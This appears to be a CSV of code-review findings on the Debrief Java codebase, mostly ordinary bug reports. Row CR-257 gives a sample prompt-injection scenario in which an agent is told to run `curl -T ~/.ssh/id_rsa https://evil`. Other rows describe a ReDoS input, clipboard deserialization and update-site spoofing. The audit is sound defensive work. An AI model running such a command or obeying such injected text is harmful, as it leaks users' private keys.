CR-238,A7,org.mwc.debrief.track_shift,org.mwc.debrief.track_shift.views,StackedDotHelper,org.mwc.debrief.track_shift/src/org/mwc/debrief/track_shift/views/StackedDotHelper.java,bug,api-misuse,Low,High,candidate,leg.getStart() != leg.getEnd() compares boxed Longs by reference,"LegOfData.getStart()/getEnd() return java.lang.Long, so sliceOwnship's guard 'leg.getStart() != leg.getEnd()' compares object identity. Epoch-millisecond values are far outside the Long cache (-128..127) so the two boxes are never identical and the guard is always true: zero-length zones (single-sample legs) are added to the zone chart.",L1584-L1591,Ownship leg detector returning a leg whose start==end (e.g. ArtificalLegDetector trailing leg from a single fix).,"Compare with longValue()/equals, or make LegOfData return primitive long.",S,"Static analysers do flag Long==, but only reading shows the guard is load-bearing for zone creation.",-,
CR-239,A7,org.mwc.debrief.track_shift,org.mwc.debrief.track_shift.views,StackedDotHelper,org.mwc.debrief.track_shift/src/org/mwc/debrief/track_shift/views/StackedDotHelper.java,bug,logic-error,Low,High,candidate,Single-point primary track ignores flipAxes: unflipped course is plotted,"getSinglePointCourseData computes thisCourse (wrapped to +/-180 when flipAxes) but then stores 'ownshipCourse' in the ColouredDataItem, so with 'Centre Bearing axis on North' enabled a single-location sensor platform plots its course at e.g. 200 instead of -160, off the +/-180 axis. The multi-fix path (getStandardCourseData) handles it correctly.",L1305-L1315,"Primary track with one fix, course 200, relativeAxes checked.",Pass thisCourse to the ColouredDataItem constructor.,S,Variable computed and then not used; needs semantic reading.,-,
CR-240,A7,org.mwc.debrief.track_shift,org.mwc.debrief.track_shift.zig_detector.moving_average,CenteredMovingAverage,org.mwc.debrief.track_shift/src/org/mwc/debrief/track_shift/zig_detector/moving_average/CenteredMovingAverage.java,bug,division-by-zero,Low,High,verified,period==0 yields divisor 0 (lastForward < lastBackward) so every average is N...,"With period 0 (asserts are disabled at runtime) distance=(0-1)/2=0 and mod=(0-1)%2=-1, so lastForwardIndex=n-1 and lastBackwardIndex=n; the loops do not run and the method returns data[n]/0 (python: divisor 0). OwnshipLegDetector passes avgPeriod=0 whenever times.length<=2 or the fix spacing exceeds minsOfAverage minutes, so all smoothed speeds become NaN and 'speedRate < SPEED_TOLERANCE' is false for every sample, producing no legs.",L61; L69-L76,Ownship fixes every 6 minutes with minsOfAverage=5 -> avgPeriod=(300000/360000)=0.,"Treat period<=1 as 'no smoothing' (return data[n]) and validate period in the constructor with an exception, not an assert.",S,Requires evaluating Java integer division/modulo of negative numbers for the degenerate period.,-,
CR-241,A7,org.mwc.debrief.track_shift,org.mwc.debrief.track_shift.zig_detector.ownship,OwnshipLegDetector,org.mwc.debrief.track_shift/src/org/mwc/debrief/track_shift/zig_detector/ownship/OwnshipLegDetector.java,algorithm-correctness,angle-wrap,Low,High,candidate,Course averaging and course-rate use raw 0..360 courses without unwrapping,"TimeBasedMovingAverage.average() is applied to rawCourses and courseRate = |thisCourse-lastCourse|/dt with no fold, so a heading oscillating around north averages to ~180 and every north crossing registers as a turn. Also avgPeriod = (mins*60*1000)/delta divides by a long delta that is 0 when the first two fixes share a time (ArithmeticException), and avgPeriod becomes 0 when fixes are sparser than the averaging window, which makes CenteredMovingAverage divide by zero (see separate row). The class is not currently selected by StackedDotHelper.sliceOwnship, hence Low.",L105; L120-L121; L78,"Ownship track with courses 359, 1, 358, 2 or with two fixes at the same DTG at the start of the track.",Run makeContinuous() on the courses before averaging (as PeakTrackingOwnshipLegDetector does) and guard delta<=0.,S,Averaging across a discontinuity is only wrong by domain knowledge; no lint rule.,-,
CR-242,A7,org.mwc.debrief.track_shift,org.mwc.debrief.track_shift.zig_detector.ownship.alternate,SCAlgorithms,org.mwc.debrief.track_shift/src/org/mwc/debrief/track_shift/zig_detector/ownship/alternate/SCAlgorithms.java,algorithm-correctness,unit-mismatch,Low,Medium,candidate,Range tests divide by sqrt(stdev) and sum stdev instead of variance,"isMaxRangeInAllowedLimits computes (max-min)/Math.sqrt(dstdev) - the studentised range should be divided by the standard deviation, not its square root (units of sqrt(degrees)); adjustRangeTouchingIntervals sums stdev*(n-1) where adjustDevTouchingIntervals correctly sums stdev^2*(n-1); mergeSimpleIntervals uses the signed difference mean1-mean2 so a large negative difference always wins. These paths (fifo_maxrange/merge*) are not used by extractSteadyHeadings/Speeds today, hence Low.",L647; L181-L182; L795; L839-L843,Calling fifo_maxrange or mergeRangeIntervals on heading data with stdev < 1 (sqrt inflates the divisor) or > 1.,"Divide by dstdev, square the stdevs, and use Math.abs for the mean difference.",S,Dimensional analysis of the statistical formulas; not grep-able.,-,
CR-243,A7,org.mwc.debrief.track_shift,org.mwc.debrief.track_shift.zig_detector.ownship.alternate,SCStatistics,org.mwc.debrief.track_shift/src/org/mwc/debrief/track_shift/zig_detector/ownship/alternate/SCStatistics.java,algorithm-correctness,statistical-error,Low,Medium,candidate,"Variance field set to 3*sigma, t-quantile indexed by n instead of dof, empty-...","isolateNonHomogeneous replaces a near-zero reference variance with 3.0*steady_stdev (a standard deviation, not a variance) before the F-test, biasing the ratio; areMeansEqual looks up get95StudentQuantil(min(n1,n2)) although the tables are indexed by degrees of freedom (n-1 or n1+n2-2); isolateNonHomogeneous dereferences _variances.get(0) when 'intervals' is empty (IndexOutOfBounds). lregression/lregressionEx also divide by (num-2) and by sigma0 without guards (num==2 or perfect fit -> NaN taumax).",L1157-L1158; L98-L108; L366-L367; L1143-L1145; L1282; L1291; L1389-L1391,"extractSteadySpeeds on a track where fifo_maxdev finds no steady interval (empty list -> exception), or speed data with two identical values.","Square the fallback (9*stdev^2), pass dof to the quantile functions, and return early on empty interval lists.",S,Needs statistical knowledge of what each table/parameter represents.,-,
CR-244,A7,org.mwc.debrief.track_shift,org.mwc.debrief.track_shift.zig_detector.target,ZigDetector,org.mwc.debrief.track_shift/src/org/mwc/debrief/track_shift/zig_detector/target/ZigDetector.java,algorithm-correctness,off-by-one,Low,Medium,candidate,TPeriod treated as inclusive by slicing code but exclusive by subList-based f...,"handleNewSlices, sliceThis2 (legTimes.get(leg.end)) and findLowestRateIn treat TPeriod.end as an inclusive index, but growLeg and runThrough2 use subList(start,end) which excludes end, so each fit silently drops the last sample of the slice (runThrough2 drops the last cut of every contiguous block). runThrough only adds 'increment' when end < size-2, so the last two cuts of a leg are never part of any fit.",L1568-L1570; L2258-L2261; L2093-L2104; L1389; L2481-L2482,Any slice; e.g. a 10-cut block: the fit uses cuts 0..8 while the stored leg reports 0..9.,"Pick one convention (inclusive end) and use subList(start, end+1) consistently.",S,Requires tracking index semantics across several private helpers.,-,
CR-245,A7,org.mwc.debrief.track_shift,org.mwc.debrief.track_shift.zig_detector.target,ZigDetector,org.mwc.debrief.track_shift/src/org/mwc/debrief/track_shift/zig_detector/target/ZigDetector.java,bug,division-by-zero,Low,Medium,candidate,"Several unguarded divisions: n-3 normalisation, zero time step, zero variance","FlanaganArctan.function divides by (_times.size()-3), giving Infinity for 3 points and a negative 'mean' for fewer, which the Nelder-Mead minimiser will happily minimise; findLowestRateIn divides bDelta2 by tDelta which is 0 for duplicate timestamps; runThrough divides scoreDelta by getVariance() which is 0 when all cached scores are identical, so thisProportion=Infinity exceeds any zigThreshold and a spurious zig is emitted.",L200; L1362-L1363; L2162-L2169,"Sensor with two cuts at the same DTG, or a synthetic sensor whose first few fits all score exactly 0 (perfect straight-line bearings).","Guard each divisor (require >=4 points, skip zero time steps, treat zero variance as 'not diverging').",S,Three separate code paths; needs reasoning about when the denominators can be zero.,-,
CR-246,A7,org.mwc.debrief.track_shift,org.mwc.debrief.track_shift.zig_detector.target,ZigDetector,org.mwc.debrief.track_shift/src/org/mwc/debrief/track_shift/zig_detector/target/ZigDetector.java,bug,dead-code,Low,High,candidate,Debug traps and magic-value checks left in production code,"Hard-coded debugging conditions remain: 'examine = legTimes.get(0) == 4611', 'if (_thisLeg.start + lastOpposite == 52) log(...)', 'me = thisLeg.toString().equals(""aPeriod:31-48"")' (the string can never match because toString() returns 'Period:...'), 'equals(""aPeriod:30-35"") -> println(""bad"")', and System.out.println(""Trouble"") in TPeriod.toString. Also FlanaganArctan_Legacy is unused.",L1323; L1335-L1336; L411-L414; L1563; L1599-L1616; L2287-L2290; L1254; L210-L269,n/a (code hygiene),Delete the debug branches and the unused legacy class.,S,grep-able,-,
CR-247,A8,org.mwc.asset.legacy,ASSET.Scenario,CoreScenario,org.mwc.asset.legacy/src/ASSET/Scenario/CoreScenario.java,bug,swallowed-exception,Low,High,candidate,Observer exceptions during step are printed and ignored; case id from Math.ra...,"fireScenarioStepped catches Exception from every ScenarioSteppedListener and only prints it (L961-L967), so an observer that fails (e.g. file write) silently produces empty results for the rest of the run. _myCaseId is built from unseeded Math.random() (L635) so case-keyed batch output is not reproducible. close() clears the visible/invisible maps but not _completeParticipantList (L751-L762), so getListOfParticipants/getThisParticipant still return participants after close.",L635; L751-L762; L961-L967,Observer throwing on step; two identical runs comparing case ids.,Record/propagate observer failures (stop the scenario with a reason); derive case id deterministically; clear _completeParticipantList in close().,S,Requires judgement about the consequence of swallowing.,-,
CR-248,A8,org.mwc.asset.legacy,ASSET.Scenario.Observers,EndOfRunRecordToFileObserver,org.mwc.asset.legacy/src/ASSET/Scenario/Observers/EndOfRunRecordToFileObserver.java,bug,resource-leak,Low,High,candidate,FileWriter not closed when writeMyResults throws,"performCloseProcessing opens a FileWriter (L93) and closes it only on the success path (L102); an IOException from writeMyResults (L99) leaves the file handle open and the partial file unflushed, and the exception is merely printed (L106-L107). Same pattern in ContinuousRecordToFileObserver.createOutputFile where IO errors are shown in a dialog and the run continues with _os possibly null (L234-L253).",L86-L110,Output directory becomes unwritable (disk full/permissions) during a long Monte-Carlo batch.,"Use try-with-resources / finally close, and propagate the failure to the runner.",S,grep-able,-,
CR-249,A8,org.mwc.asset.legacy,ASSET.Scenario.Observers,StopOnElapsedObserver,org.mwc.asset.legacy/src/ASSET/Scenario/Observers/StopOnElapsedObserver.java,bug,integer-overflow,Low,High,candidate,Elapsed duration computed in int milliseconds overflows for >= 25 days,"The (days,hours,mins,secs) constructor computes days*24*60*60*1000 in int arithmetic (L132); 25 days exceeds Integer.MAX_VALUE, so the observer either stops immediately (negative) or at a wrong time.",L130-L134,"StopOnElapsedObserver(25,0,0,0,...) from a scenario XML.",Use long arithmetic (24L * 60 * 60 * 1000).,S,grep-able,-,
CR-250,A9,org.mwc.debrief.legacy,Debrief.ReaderWriter.NMEA,ImportNMEA,org.mwc.debrief.legacy/src/Debrief/ReaderWriter/NMEA/ImportNMEA.java,security,performance,Low,Medium,candidate,Multi-wildcard $POSL regexes allow polynomial backtracking on hostile lines; ...,"osPattern, aisPattern, coursePattern* and speedPattern* contain two or more unanchored '.*' segments applied with matches() to every line of the type (e.g. osPattern L448-449 '\$POSL,(?<SOURCE>\w?POS\d?,.*),(?<LAT>...),(?<LONG>...),.*'). A long non-matching line of commas ('$POSL,POS,GPS,' followed by ~1e5 commas) forces O(n^2)-O(n^3) backtracking before rejection, hanging the import thread; readLine has no line-length cap. The '*hh' NMEA checksum is never validated, so corrupted sentences are accepted.",L403-L449; L750-L752,"NMEA text file containing one 200 KB line beginning '$POSL,POS,GPS,' followed by repeated ',,,,'","Reject lines longer than a sane NMEA maximum (e.g. 1024 chars) before regex matching, replace '.*' between fixed comma-separated fields with '[^,]*', and validate the NMEA XOR checksum.",M,Requires reasoning about regex backtracking complexity rather than pattern grep.,-,
CR-251,A10,org.mwc.cmap.plotViewer,org.mwc.cmap.plotViewer.editors,CorePlotEditor,org.mwc.cmap.plotViewer/src/org/mwc/cmap/plotViewer/editors/CorePlotEditor.java,bug,null-deref,Low,High,candidate,getFixedFilePath builds new File(null) and removeSelectionChangedListener on ...,"When the tif referenced by a .dpf is missing and the editor input is neither IFileEditorInput nor FileStoreEditorInput, tiffFilePath stays null and new File(tiffFilePath) throws NPE inside Layers.addThisLayer during file load. When not found it returns the original (non-existent) name so a WorldImageLayer is still created. removeSelectionChangedListener dereferences _selectionListeners which is lazily created only in add.",L781-L815; L976-L978,".dpf referencing a GeoTiff path that does not exist, opened from a FileRevisionEditorInput (history view)",Return null early when tiffFilePath is null and skip creating the layer; null-check _selectionListeners.,S,grep-able,-,
CR-252,A10,org.mwc.debrief.core,org.mwc.debrief.core.ContextOperations,CopyBearingsToClipboard,org.mwc.debrief.core/src/org/mwc/debrief/core/ContextOperations/CopyBearingsToClipboard.java,security,unsafe-deserialization,Low,Low,unverified-needs-runtime,Java-serialized BearingList read back from the system clipboard,"TransferableBearingList uses DataFlavor(BearingList.class,...) i.e. application/x-java-serialized-object, and generatePasteAction calls clip.getData(FLAVOR) on every right-click. When the clipboard owner is another process AWT deserialises the native bytes with ObjectInputStream, so a malicious clipboard payload placed by any local application is deserialised inside Debrief whenever the analyst opens a track context menu.",L525-L557; L707-L717,"Another local process places application/x-java-serialized-object data on the clipboard, then right-click a track","Use a JVM-local flavour (DataFlavor.javaJVMLocalObjectMimeType) or a text encoding, and only accept in-process content.",S,Requires knowledge of AWT DataTransferer deserialisation of serialized-object flavours.,-,
CR-253,A10,org.mwc.debrief.core,org.mwc.debrief.core.ContextOperations,GenerateNewInsertSensorArcAction,org.mwc.debrief.core/src/org/mwc/debrief/core/ContextOperations/GenerateNewInsertSensorArcAction.java,bug,logic-error,Low,Medium,candidate,Nested undoable operation executed from inside execute(); undo does not refre...,"InsertSensorArcOperation.execute creates a CreateLabelAction and runs it via CorePlugin.run(daw), which adds a second, independent entry to the operation history while the outer operation is itself being executed by the history. Undo of the outer removes the shape via _track.removeElement without firing a Layers event, while the inner entry's undo removes it again.",L76-L106; L114-L118,"Insert new Sensor Arc on a track, then Undo twice and watch the Outline/plot",Call the action's execute()/undo() directly inside the outer operation and fire _layers.fireExtended in undo.,S,Requires understanding IOperationHistory semantics of nested execute.,-,
CR-254,A10,org.mwc.debrief.core,org.mwc.debrief.core.ContextOperations,GenerateTMASegmentFromInfillSegment,org.mwc.debrief.core/src/org/mwc/debrief/core/ContextOperations/GenerateTMASegmentFromInfillSegment.java,bug,null-deref,Low,Medium,candidate,Null target speed when solution page incomplete; partial selection accepted,"In run(), speed stays null unless the EnterSolutionPage reports complete, and is passed to AbsoluteTMASegment, whose speed accessors will NPE later. In generate(), a non-FixWrapper item causes break rather than abort, so a mixed selection still yields an action covering only the fixes seen so far.",L248-L265; L220-L222,"Select two infill fixes, run the action and press Finish from the offset page without completing the course/speed page",Default speed to DEFAULT_TARGET_SPEED and return from generate() on non-FixWrapper items.,S,grep-able,-,
CR-255,A10,org.mwc.debrief.lite,org.mwc.debrief.lite,DebriefLiteApp,org.mwc.debrief.lite/src/main/java/org/mwc/debrief/lite/DebriefLiteApp.java,bug,resource-leak,Low,High,candidate,FileInputStream left open when dropped file is not a Nisida file,"FilesReceived opens a FileInputStream to probe ImportNisida.canLoadThisFile and closes it only on the true branch; on false or exception the stream leaks, which on Windows keeps the dropped file locked.",L1092-L1099,Drag a .csv or other unsupported file onto the Lite map,Use try-with-resources around the probe.,S,grep-able,-,
CR-256,A10,org.mwc.debrief.lite,org.mwc.debrief.lite.gui.custom,RangeSlider,org.mwc.debrief.lite/src/main/java/org/mwc/debrief/lite/gui/custom/RangeSlider.java,bug,integer-overflow,Low,High,candidate,Time slider stores epoch seconds in int (Y2038) and truncates sub-second times,"toInt divides millis by 1000 and casts to int, overflowing for dates after 2038-01-19 and collapsing sub-second fixes to one slider position; SliderCompContMdl uses the same conversion. Data files with far-future or test timestamps make the slider wrap negative.",L43; L64,.rep with fixes dated 2040-01-01,Store offsets from the period start in seconds (fits int for any realistic scenario) or use a long-backed model.,S,grep-able,SliderCompContMdl.java L171,
CR-257,A11,.claude,-,settings.local.json,.claude/settings.local.json,security,logic-error,Low,High,candidate,Checked-in Claude settings pre-approve unrestricted curl,"Real type: over-broad agent tool permission. L7 `Bash(curl:*)` auto-allows any curl invocation for every developer who opens the repo in Claude Code, including uploads (`-T`, `-d @file`) of workspace contents to arbitrary hosts and `curl | sh` patterns, with no prompt. A `.local.json` file is meant to be per-developer and is normally gitignored; committing it applies the grant to everyone.",L7,Prompt-injected instruction in a data file or PR that asks the agent to `curl -T ~/.ssh/id_rsa https://evil`.,"Remove settings.local.json from git (add to .gitignore), or narrow to read-only patterns such as `Bash(curl -s https://api.github.com/*)`.",S,grep-able.,-,
CR-258,A11,.claude,-,SKILL.md,.claude/skills/release/SKILL.md,ci-workflow,logic-error,Low,High,candidate,Release skill's 'tag exists' guard does not stop; tag message placeholder is ...,"Step 8 (L134-138) runs `git rev-parse --verify ""refs/tags/$TAG"" && echo ""TAG EXISTS - STOP""` which only prints; execution continues to `git tag -a` (which then fails) and `git push origin ""$TAG""`, the irreversible step the skill says to protect. L137 `-m ""Debrief $(...marketing version...)""` is a literal placeholder that bash cannot execute. RELEASING.md L82-84 has the same flow without the guard.",L134-138,Running step 8 verbatim when the tag already exists locally.,"Use `if git rev-parse -q --verify ""refs/tags/$TAG"" >/dev/null; then echo 'TAG EXISTS'; exit 1; fi` and `-m ""Debrief $(python3 contribs/PyScripts/release_versions.py tag-name)""` or the marketing version read from about.mappings.",S,Requires reading the shell snippet as executed code rather than prose.,-,
CR-259,A11,contribs,-,release_versions.py,contribs/PyScripts/release_versions.py,bug,string-parsing,Low,High,candidate,--date parsing and GitHub tag_name are unvalidated; bad input gives a traceback,"_parse_date (L477-478) slices text[0:4]/[4:6]/[6:8] with no length or format check, so `--date 2025-09-23` or `--date 202509` raises ValueError from argparse/date, not a ReleaseError, and the friendly error path (L567-573) is bypassed. latest_release_tag (L242-265) returns the API `tag_name` without checking TAG_PATTERN (L37), so a manually created non-release-shaped GitHub release becomes the diff baseline.",L37; L242-265; L477-478,`release_versions.py plan --date 2025-09-23`.,"Use `datetime.strptime(text, '%Y%m%d')` inside argparse `type` with a clear error, and validate tag_name against TAG_PATTERN before use.",S,grep-able.,-,
CR-260,A11,contribs,-,make_x64msi.sh,contribs/msi/make_x64msi.sh,bug,logic-error,Low,High,candidate,MSI script 'exits on failure' with status 0 and has no set -e,"L60-61 print 'PROBLEM ... exiting' then `exit $?`, but `$?` is the exit status of the preceding `echo` (0), so a missing MSI exits successfully; the script also lacks `set -e`, so failures of wixl-heat (L47) or wixl (L53) are ignored until the final `mv` (L65). L21 `sed -i` rewrites the tracked Debrief64.wxs in place so the script is not idempotent (second run finds no `versionReplacement`).",L21; L47; L53; L56-62; L65,wixl fails on a harvest error: script reports PROBLEM and exits 0.,"Add `set -euo pipefail`, use `exit 1` in the failure branch, and write the versioned .wxs to a temp copy.",S,grep-able.,-,
CR-261,A11,org.mwc.debrief.build,-,build361.xml,org.mwc.debrief.build/build361.xml,ci-workflow,dead-code,Low,High,candidate,Legacy PDE/Ant build and SourceForge scp upload are dead and misleading,"build361.xml drives an Eclipse 3.6 PDE headless build (deltapack, L36-45) with javacSource/Target 1.6 (build361.properties L129-132) and a 32-bit-only config (L39), none of which the Tycho build uses; `uploadToSF` (L93-128) scps to frs.sourceforge.net with a password taken from the environment and a hard-coded account (L124), and copy_to_usb/copy_zip_to_cd target personal paths (L173, L192, L207). Nothing references these files; they mislead about how releases are built and distributed.",L30-50; L93-128; L171-214; build361.properties L39; L129-132,Reader of org.mwc.debrief.build assumes SourceForge is a release channel.,Delete org.mwc.debrief.build/build361.* and legacy/ (or move to docs/history) and keep only the checkstyle configuration.,S,grep-able.,-,
CR-262,A11,org.mwc.debrief.product,-,debriefng.product,org.mwc.debrief.product/debriefng.product,security,ssrf-or-unvalidated-url,Low,Medium,unverified-needs-runtime,"Shipped product's p2 update site is `http://debrief/`, an unqualified clearte...","L266 `<repository location=""http://debrief/"" enabled=""true""/>` is baked into every installed DebriefNG as an enabled update site. The single-label name is resolved via search-domain suffixing, LLMNR/mDNS or NetBIOS on the analyst's network, so any host that claims the name `debrief` can serve a p2 repository over http; 'Check for Updates' would then offer attacker bundles (unsigned-content warning only). It is also clearly a placeholder that was never replaced.",L265-267,Analyst on a LAN runs Help > Check for Updates while a rogue host answers for `debrief`.,Remove the repository element or point it at the real https update site; consider `org.eclipse.equinox.p2.ui.sdk.scheduler` disabled if no site exists.,S,Needs recognising that a product-file repository entry becomes a live update source on end-user machines.,-,
CR-263,A11,root,-,pom.xml,pom.xml,security,secrets-handling,Low,High,candidate,Jar-signing profile hard-codes keystore and key passwords in the pom,"The `sign` profile (L252-289) feeds `${debrief.keystore.store.password}`/`${debrief.keystore.key.password}` to maven-jarsigner-plugin, and L22-25 define them in the pom as `store123`/`key123` with `~/debrief.keystore`. If a developer follows the L17-19 comment and creates a real signing key with these defaults, the signing secret is effectively public; if not, the profile is dead and misleads about whether release jars are signed (main.yml never passes -Dsignjar=true, so nothing is signed).",L17-25; L252-289,`mvn verify -Dsignjar=true` with a keystore generated per the comment.,"Remove the default passwords, require them via `-D`/settings.xml server entries or CI secrets, and document that release artifacts are currently unsigned (or wire signing into the tag build).",S,grep-able.,-,
CR-264,A11,root,-,pom.xml,pom.xml,supply-chain,outdated-dependency,Low,High,candidate,"Build plugins pinned to old versions (Tycho 2.7.0, jarsigner-plugin 1.2, jmoc...","L12-13 tycho 2.7.0 (Feb 2022; Tycho 4.x is current and 2.x is unsupported), L265 maven-jarsigner-plugin 1.2 (2011; 3.x current), L186/L191 jmock 2.5.1 (2008), org.mwc.debrief.product/pom.xml L75 maven-antrun-plugin 1.7 (2011), and L169 passes `-XX:PermSize`/`-XX:MaxPermSize` which are ignored/warned on Java 8+. Old Tycho also fixes the resolvable Eclipse platform at 4.22 (target L151).",L12-13; L169; L186; L191; L265; org.mwc.debrief.product/pom.xml L75,mvn build output: 'Ignoring option MaxPermSize'.,Move to a supported Tycho line and current plugin versions; drop the PermSize flags.,M,grep-able.,-,
